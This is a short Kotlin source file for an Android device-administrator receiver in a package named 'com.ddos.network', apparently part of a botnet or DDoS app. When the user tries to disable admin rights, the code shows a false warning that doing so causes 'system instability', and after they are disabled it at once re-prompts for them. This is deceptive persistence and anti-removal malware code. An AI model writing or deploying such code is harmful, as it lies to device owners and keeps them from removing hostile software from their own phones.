package com.ddos.network

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent

class DeviceAdmin : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        // Device admin activated — service can start fully
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        return "Disabling this will cause system instability."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        // Re-request admin if disabled
        val reEnable = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        reEnable.putExtra(
            android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
            android.content.ComponentName(context, DeviceAdmin::class.java)
        )
        reEnable.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        context.startActivity(reEnable)
    }
}
